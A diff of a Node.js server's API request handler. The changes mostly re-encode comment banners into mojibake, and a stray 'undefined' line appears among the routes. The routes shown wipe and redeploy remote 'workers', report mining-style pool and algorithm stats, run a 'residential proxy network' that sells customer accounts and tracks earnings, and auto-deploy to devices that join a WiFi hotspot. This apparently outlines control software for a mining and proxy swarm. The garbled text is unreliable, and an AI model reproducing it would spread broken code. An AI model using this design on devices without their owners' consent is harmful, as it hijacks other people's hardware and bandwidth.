+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Remote Wipe & Redeploy
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• POST /api/wipe/device â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/wipe/device Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/wipe/device') {
       var RemoteWipe = require('./remote-wipe');
       if (!_refs.remoteWipe) {
@@ -4724,7 +4784,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/wipe/stuck â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/wipe/stuck Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/wipe/stuck') {
       var RemoteWipe = require('./remote-wipe');
       if (!_refs.remoteWipe) {
@@ -4736,7 +4796,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/wipe/site â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/wipe/site Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/wipe/site') {
       var RemoteWipe = require('./remote-wipe');
       if (!_refs.remoteWipe) {
@@ -4748,7 +4808,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/wipe/stuck â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/wipe/stuck Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/wipe/stuck') {
       var RemoteWipe = require('./remote-wipe');
       if (!_refs.remoteWipe) {
@@ -4757,7 +4817,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { stuck: _refs.remoteWipe.getStuckWorkers(), stats: _refs.remoteWipe.getStats() });
     }
 
-    // â•â•â• GET /api/wipe/log â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/wipe/log Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/wipe/log') {
       var RemoteWipe = require('./remote-wipe');
       if (!_refs.remoteWipe) {
@@ -4766,11 +4826,11 @@ async function handleRequest(req, res) {
       return json(res, 200, { log: _refs.remoteWipe.getWipeLog(), stats: _refs.remoteWipe.getStats() });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Swarm Intelligence
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/intelligence/consensus â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/intelligence/consensus Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/intelligence/consensus') {
       var SwarmIntelligence = require('./swarm-intelligence');
       if (!_refs.swarmIntelligence) {
@@ -4779,7 +4839,7 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.swarmIntelligence.getConsensus());
     }
 
-    // â•â•â• GET /api/intelligence/recommendations â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/intelligence/recommendations Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/intelligence/recommendations') {
       var SwarmIntelligence = require('./swarm-intelligence');
       if (!_refs.swarmIntelligence) {
@@ -4788,7 +4848,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { recommendations: _refs.swarmIntelligence.getRecommendations() });
     }
 
-    // â•â•â• POST /api/intelligence/apply â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/intelligence/apply Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/intelligence/apply') {
       var SwarmIntelligence = require('./swarm-intelligence');
       if (!_refs.swarmIntelligence) {
@@ -4797,7 +4857,7 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.swarmIntelligence.applyRecommendation(body.id));
     }
 
-    // â•â•â• POST /api/intelligence/auto â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/intelligence/auto Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/intelligence/auto') {
       var SwarmIntelligence = require('./swarm-intelligence');
       if (!_refs.swarmIntelligence) {
@@ -4806,7 +4866,7 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.swarmIntelligence.autoOptimize(body.enabled));
     }
 
-    // â•â•â• GET /api/intelligence/cpu-profiles â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/intelligence/cpu-profiles Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/intelligence/cpu-profiles') {
       var SwarmIntelligence = require('./swarm-intelligence');
       if (!_refs.swarmIntelligence) {
@@ -4815,7 +4875,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { profiles: _refs.swarmIntelligence.getCpuProfiles() });
     }
 
-    // â•â•â• GET /api/intelligence/pool-stats â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/intelligence/pool-stats Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/intelligence/pool-stats') {
       var SwarmIntelligence = require('./swarm-intelligence');
       if (!_refs.swarmIntelligence) {
@@ -4824,7 +4884,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { pools: _refs.swarmIntelligence.getPoolStats() });
     }
 
-    // â•â•â• GET /api/intelligence/algo-stats â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/intelligence/algo-stats Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/intelligence/algo-stats') {
       var SwarmIntelligence = require('./swarm-intelligence');
       if (!_refs.swarmIntelligence) {
@@ -4833,7 +4893,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { algos: _refs.swarmIntelligence.getAlgoStats() });
     }
 
-    // â•â•â• POST /api/intelligence/discovery â•â•â• (workers report discoveries here)
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/intelligence/discovery Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â (workers report discoveries here)
     if (method === 'POST' && reqPath === '/api/intelligence/discovery') {
       var SwarmIntelligence = require('./swarm-intelligence');
       if (!_refs.swarmIntelligence) {
@@ -4843,18 +4903,18 @@ async function handleRequest(req, res) {
       return json(res, 200, { ok: true });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Residential Proxy Network
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/proxy/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/proxy/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/proxy/status') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
       return json(res, 200, _refs.proxyNetwork.getStatus());
     }
 
-    // â•â•â• POST /api/proxy/start â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/proxy/start Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/proxy/start') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
@@ -4862,13 +4922,13 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.proxyNetwork.startGateway(body.port));
     }
 
-    // â•â•â• POST /api/proxy/stop â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/proxy/stop Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/proxy/stop') {
       if (!_refs.proxyNetwork) return json(res, 200, { ok: true, message: 'Not running' });
       return json(res, 200, _refs.proxyNetwork.stopGateway());
     }
 
-    // â•â•â• POST /api/proxy/customer â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/proxy/customer Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/proxy/customer') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
@@ -4876,21 +4936,21 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.proxyNetwork.addCustomer(body.username, body.password, body.gbLimit, body.expiresAt));
     }
 
-    // â•â•â• GET /api/proxy/customers â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/proxy/customers Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/proxy/customers') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
       return json(res, 200, { customers: _refs.proxyNetwork.listCustomers() });
     }
 
-    // â•â•â• DELETE /api/proxy/customer â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/proxy/customer Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath === '/api/proxy/customer') {
       if (!_refs.proxyNetwork) return json(res, 400, { error: 'Proxy network not initialized' });
       var body = JSON.parse(await readBody(req));
       return json(res, 200, _refs.proxyNetwork.removeCustomer(body.username));
     }
 
-    // â•â•â• GET /api/proxy/earnings â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/proxy/earnings Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/proxy/earnings') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
@@ -4899,14 +4959,14 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.proxyNetwork.getEarnings(rate));
     }
 
-    // â•â•â• GET /api/proxy/workers â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/proxy/workers Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/proxy/workers') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
       return json(res, 200, { workers: _refs.proxyNetwork.getWorkerList() });
     }
 
-    // â•â•â• POST /api/proxy/broadcast â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/proxy/broadcast Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/proxy/broadcast') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
@@ -4920,7 +4980,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { ok: true, task: task, message: 'Task generated (no swarm coordinator to broadcast)' });
     }
 
-    // â•â•â• POST /api/proxy/stop-all â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/proxy/stop-all Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/proxy/stop-all') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
@@ -4933,7 +4993,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { ok: true, task: task, message: 'Task generated (no swarm coordinator)' });
     }
 
-    // â•â•â• POST /api/proxy/login â•â•â• (public â€" customer auth for portal)
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/proxy/login Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â (public Ã¢â‚¬" customer auth for portal)
     if (method === 'POST' && reqPath === '/api/proxy/login') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
@@ -4943,7 +5003,7 @@ async function handleRequest(req, res) {
       return json(res, 200, cust);
     }
 
-    // â•â•â• GET /proxy â•â•â• (public â€" serve portal)
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /proxy Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â (public Ã¢â‚¬" serve portal)
     if (method === 'GET' && reqPath === '/proxy') {
       var portalPath = path.join(__dirname, '..', 'web', 'proxy-portal.html');
       try {
@@ -4955,14 +5015,14 @@ async function handleRequest(req, res) {
     }
 
 
-    // ═══ GET /api/proxy/networks ═══
+    // â•â•â• GET /api/proxy/networks â•â•â•
     if (method === 'GET' && reqPath === '/api/proxy/networks') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
       return json(res, 200, { networks: _refs.proxyNetwork.getConfiguredNetworks() });
     }
 
-    // ═══ POST /api/proxy/network/join ═══
+    // â•â•â• POST /api/proxy/network/join â•â•â•
     if (method === 'POST' && reqPath === '/api/proxy/network/join') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
@@ -4971,7 +5031,7 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.proxyNetwork.joinNetwork(body.network, body));
     }
 
-    // ═══ POST /api/proxy/network/leave ═══
+    // â•â•â• POST /api/proxy/network/leave â•â•â•
     if (method === 'POST' && reqPath === '/api/proxy/network/leave') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
@@ -4979,21 +5039,21 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.proxyNetwork.leaveNetwork(body.network));
     }
 
-    // ═══ GET /api/proxy/network/earnings ═══
+    // â•â•â• GET /api/proxy/network/earnings â•â•â•
     if (method === 'GET' && reqPath === '/api/proxy/network/earnings') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
       return json(res, 200, _refs.proxyNetwork.getNetworkEarnings());
     }
 
-    // ═══ GET /api/proxy/network/status ═══
+    // â•â•â• GET /api/proxy/network/status â•â•â•
     if (method === 'GET' && reqPath === '/api/proxy/network/status') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
       return json(res, 200, _refs.proxyNetwork.getNetworkStatus());
     }
 
-    // ═══ POST /api/proxy/network/broadcast ═══
+    // â•â•â• POST /api/proxy/network/broadcast â•â•â•
     if (method === 'POST' && reqPath === '/api/proxy/network/broadcast') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
@@ -5011,7 +5071,7 @@ async function handleRequest(req, res) {
       }
     }
 
-    // ═══ POST /api/proxy/network/broadcast-leave ═══
+    // â•â•â• POST /api/proxy/network/broadcast-leave â•â•â•
     if (method === 'POST' && reqPath === '/api/proxy/network/broadcast-leave') {
       var ProxyNet = require('./proxy-network');
       if (!_refs.proxyNetwork) _refs.proxyNetwork = new ProxyNet();
@@ -5023,11 +5083,11 @@ async function handleRequest(req, res) {
     }
 undefined
 
-    // ═══════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
     // WiFi Hotspot Manager
-    // ═══════════════════════════════════════════════════════
+    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
-    // ═══ GET /api/hotspot/status ═══
+    // â•â•â• GET /api/hotspot/status â•â•â•
     if (method === 'GET' && reqPath === '/api/hotspot/status') {
       var HotspotManager = require('./hotspot-manager');
       var hm = _refs.hotspotManager;
@@ -5037,7 +5097,7 @@ undefined
       return json(res, 200, st);
     }
 
-    // ═══ GET /api/hotspot/supported ═══
+    // â•â•â• GET /api/hotspot/supported â•â•â•
     if (method === 'GET' && reqPath === '/api/hotspot/supported') {
       var HotspotManager = require('./hotspot-manager');
       var hm2 = _refs.hotspotManager;
@@ -5045,7 +5105,7 @@ undefined
       return json(res, 200, hm2.isSupported());
     }
 
-    // ═══ POST /api/hotspot/start ═══
+    // â•â•â• POST /api/hotspot/start â•â•â•
     if (method === 'POST' && reqPath === '/api/hotspot/start') {
       var HotspotManager = require('./hotspot-manager');
       var hm3 = _refs.hotspotManager;
@@ -5060,7 +5120,7 @@ undefined
       } catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // ═══ POST /api/hotspot/stop ═══
+    // â•â•â• POST /api/hotspot/stop â•â•â•
     if (method === 'POST' && reqPath === '/api/hotspot/stop') {
       var hm4 = _refs.hotspotManager;
       if (!hm4) return json(res, 400, { error: 'Hotspot not initialized' });
@@ -5068,14 +5128,14 @@ undefined
       catch (e) { return json(res, 500, { error: e.message }); }
     }
 
-    // ═══ GET /api/hotspot/clients ═══
+    // â•â•â• GET /api/hotspot/clients â•â•â•
     if (method === 'GET' && reqPath === '/api/hotspot/clients') {
       var hm5 = _refs.hotspotManager;
       if (!hm5) return json(res, 200, { clients: [] });
       return json(res, 200, { clients: hm5.getClients() });
     }
 
-    // ═══ POST /api/hotspot/auto-deploy ═══
+    // â•â•â• POST /api/hotspot/auto-deploy â•â•â•
     if (method === 'POST' && reqPath === '/api/hotspot/auto-deploy') {
       var hm6 = _refs.hotspotManager;
       if (!hm6) return json(res, 400, { error: 'Hotspot not initialized' });
@@ -5084,11 +5144,11 @@ undefined
       return json(res, 200, { ok: true, autoDeployOnConnect: hm6.config.autoDeployOnConnect });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // WiFi-Aware Network Scanner
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
